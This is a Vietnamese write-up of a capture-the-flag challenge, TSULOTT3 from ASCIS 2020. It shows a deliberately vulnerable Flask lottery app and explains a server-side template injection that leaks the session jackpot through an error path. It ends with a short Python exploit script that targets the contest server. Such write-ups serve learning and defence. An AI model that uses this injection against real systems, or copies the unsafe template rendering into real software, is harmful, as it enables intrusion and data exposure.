# ASCIS 2020 QUALIFICATION ROUND

## TSULOTT3

- Đề bài:
    -- This time i made a completely new Lott, so... who want to be a millionaire?
    -- http://34.126.74.16:1337/
    -- Code

```python
from flask import Flask, session, request, render_template, render_template_string
from flask_session import Session
from random import randint as ri

app = Flask(__name__)
SESSION_TYPE = 'filesystem'
app.config.from_object(__name__)
Session(app)
cheat = "Pls Don't cheat! "

def check_session(input):
	if session.get(input) == None:
		return ""
	return session.get(input)

@app.route("/", methods=["GET","POST"])
def index():
	try:
		session.pop("name")
		session.pop("jackpot")
	except:
		pass
	if request.method == "POST":
		ok = request.form['ok']
		session["name"] = request.form['name']
		if ok == "Go":
			session["check"] = "access"
			jackpot = " ".join(str(x) for x in [ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99)]).strip()
			session["jackpot"] = jackpot
			return render_template_string("Generating jackpot...<script>setInterval(function(){ window.location='/guess'; }, 500);</script>")
	return render_template("start.html")

@app.route('/guess', methods=["GET","POST"])
def guess():
	try:
		if check_session("check") == "":
			return render_template_string(cheat+check_session("name"))
		else:
			if request.method == "POST":
				jackpot_input = request.form['jackpot']
				if jackpot_input == check_session("jackpot"):
					mess = "Really? GG "+check_session("name")+", here your flag: ASCIS{xxxxxxxxxxxxxxxxxxxxxxxxx}"
				elif jackpot_input != check_session("jackpot"):
					mess = "May the Luck be with you next time!<script>setInterval(function(){ window.location='/reset_access'; }, 1200);</script>"
				return render_template_string(mess)
			return render_template("guess.html")
	except:
		pass
	return render_template_string(cheat+check_session("name"))


@app.route('/reset_access')
def reset():
	try:
		session.pop("check")
		return render_template_string("Reseting...<script>setInterval(function(){ window.location='/'; }, 500);</script>")
	except:
		pass
	return render_template_string(cheat+check_session("name"))


if __name__ == "__main__":
	app.secret_key = 'xxxxxxxxxxxxxxxxxxxxx'
	app.run()
```

1. Detect

    Đọc đoạn code trên ta cũng hiểu được phần nào bài này.

```python
if check_session("check") == "":
    return render_template_string(cheat+check_session("name"))
else:
    if request.method == "POST":
        jackpot_input = request.form['jackpot']
        if jackpot_input == check_session("jackpot"):
            mess = "Really? GG "+check_session("name")+", here your flag: ASCIS{xxxxxxxxxxxxxxxxxxxxxxxxx}"
        elif jackpot_input != check_session("jackpot"):
            mess = "May the Luck be with you next time!<script>setInterval(function(){ window.location='/reset_access'; }, 1200);</script>"
        return render_template_string(mess)
    return render_template("guess.html")
```

Ở trang "\". server sẽ tạo ra cho ta một session["check"] lưu giá trị là "access"
Và một session["jackpot"] gồm 6 con số randint như Vietlot.

Rồi chuyển chúng ta qua trang "/guess". Nếu chúng ta nhập 6 con số vào. Và giống hết so với phía server thì chúng ta có flag.

Đến đây nếu có ai đang suy nghĩ tới việc viết script để bruce force thì khỏi thi. Đi mua Vietlott còn nhanh giàu hơn. ^^

Nhin dạng đề này ta sẽ nghĩ ngay đến Sờ Sờ TI. Server Side Template Injection.

Đầu tiên mình nghĩ tới việc dùng {{session["jackpot"]}} truyền vào jackpot ở trang "/guess"

Nhưng nghĩ lại thấy nó sai sai. Đọc kĩ phần "/guess" một vài (thật ra rất nhiều lần) lần nữa. Mình chợt thấy đoạn này.

```python
except:
    pass
return render_template_string(cheat+check_session("name"))
```

Vậy là nếu bị lỗi. Nó sẽ return về  render_template_string(cheat+check_session("name"))

Vậy ta truyền name = {{session["jackpot"]}}

Rồi truyền jackpot lên sao cho trang "/guess" bị lỗi. Thì Bingo. Trúng số rồi.

Truyền name thì ta làm rồi. Nhưng bây giờ làm sao để cho trang "/guess" bị lỗi đâu.

Với kinh nghiệm fix bug crawl data python nhiều tháng. Mình nhận thấy đoạn này có thể dụng được.

```python
jackpot_input = request.form['jackpot']
```

Tại đoạn này trong khi dùng dictionary mình lỗi hoài à. Phải try expect miết.

Nếu truyền jackpot là None thì lỗi cmnr.

Rồi xong phần lý thuyết. Code để lấy flag thôi.

2. Code

```python
import requests
url = "http://34.126.74.16:1337/"
url_guess = "http://34.126.74.16:1337/guess"
r = requests.Session()
res = r.get(url)
res = r.post(url, data={"name":'{{session["jackpot"]}}','ok':'Go'})
res = r.post(url_guess, data = {"jackpot" : None})
jackpot = res.text.replace("Pls Don't cheat! ", "")
print(jackpot)
res = r.post(url_guess, data = {"jackpot" : jackpot})
print(res.text)
r.close()
```

Code có một đoạn nhỏ. Để khỏi mất công lên trình duyện rước bực vào thân.

Nhìn cũng khá dễ hiêu.

- Đầu tiên tạo một phiên làm việc.
- Sau đó post name lên trang "/".
- Tiếp theo post jackpot = None lên trang "/guess".
- In ra jackpot server random ra.
- Lưu jackpot đó lại, post lên một lần nữa => Ra flag.